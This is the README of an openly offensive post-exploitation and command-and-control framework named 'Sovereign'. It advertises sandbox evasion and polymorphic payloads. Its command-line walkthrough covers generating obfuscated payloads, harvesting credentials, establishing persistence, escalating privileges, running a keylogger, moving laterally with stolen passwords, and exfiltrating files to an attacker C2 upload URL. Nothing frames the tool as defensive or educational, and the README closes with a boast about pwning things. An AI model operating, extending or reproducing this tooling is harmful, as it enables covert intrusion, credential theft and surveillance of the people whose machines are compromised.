# Sovereign Post-Exploitation Framework

This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.

## Features

- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
- **Secure Communication**: Encrypted communication between agent and C2 server.
- **Modular Design**: Easily add new modules and functionalities.
- **Logging and Reporting**: Detailed logging and report generation.

## Usage

### Setting Up the C2 Server

1. **Create a Python virtual environment and activate it**:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows: venv\Scripts\activate
    ```

2. **Install the required dependencies**:
    ```bash
    pip install -r c2_server/requirements.txt
    ```

3. **Run the C2 server**:
    ```bash
    python c2_server/c2_server.py
    ```

### Using the CLI

The CLI provides various commands to interact with the framework.

#### List all registered agents:
```bash
python cli/cli.py list-agents
```

#### Interact with a specific agent:
```bash
python cli/cli.py select-agent AGENT_ID
```

#### Send a command to a specific agent:
```bash
python cli/cli.py send-command --agent_id AGENT_ID --command "Your command here"
```

#### Generate an obfuscated payload for a specific platform:
```bash
python cli/cli.py generate-payload --platform PLATFORM
```

#### Harvest credentials:
```bash
python cli/cli.py harvest-credentials
```

#### Establish persistence:
```bash
python cli/cli.py establish-persistence
```

#### Escalate privileges:
```bash
python cli/cli.py escalate-privileges
```

#### Gather system information:
```bash
python cli/cli.py gather-system-info
```

#### Exfiltrate data:
```bash
python cli/cli.py exfiltrate-data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
```

#### Start keylogger:
```bash
python cli/cli.py start-keylogger --log_file_path /path/to/log_file
```

#### Move laterally:
```bash
python cli/cli.py move-laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
```

### Example Commands

1. **Listing all registered agents**:
    ```bash
    python cli/cli.py list-agents
    ```

2.    #### Interact with a specific agent:
```bash
python cli/cli.py select-agent AGENT_ID
```

3.    #### Interact with a selected agent:
```bash
Get-ComputerInfo
```

4. **Sending a command to a specific agent**:
    ```bash
    python cli/cli.py send-command --agent_id 1234-5678-9101-1121 --command "whoami"
    ```

5. **Generating a payload for Windows**:
    ```bash
    python cli/cli.py generate-payload --platform windows
    ```

6. **Harvesting credentials**:
    ```bash
    python cli/cli.py harvest-credentials
    ```

7. **Establishing persistence**:
    ```bash
    python cli/cli.py establish-persistence
    ```

8. **Escalating privileges**:
    ```bash
    python cli/cli.py escalate-privileges
    ```

9. **Gathering system information**:
    ```bash
    python cli/cli.py gather-system-info
    ```

10. **Exfiltrating data**:
    ```bash
    python cli/cli.py exfiltrate-data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
    ```

11. **Starting a keylogger**:
    ```bash
    python cli/cli.py start-keylogger --log_file_path /path/to/log_file
    ```

12. **Moving laterally**:
    ```bash
    python cli/cli.py move-laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
    ```

### Logging and Reporting

Logs are stored in the `c2_server.log` file located in the `c2_server` directory. This file contains detailed information about agent activities and commands executed.

To generate a report from the logged data, run the following command:
```bash
python c2_server/c2_server.py generate-report
```
This will create a `report.txt` file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.

### Adding New Modules

To add new post-exploitation modules, create a new Python file in the `CLI/modules` directory and implement the desired functionality. Update the CLI script to include commands for the new module.

### Contribution

Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.

### License

This project is licensed under the MIT License.

# By the way, we pwn things.....
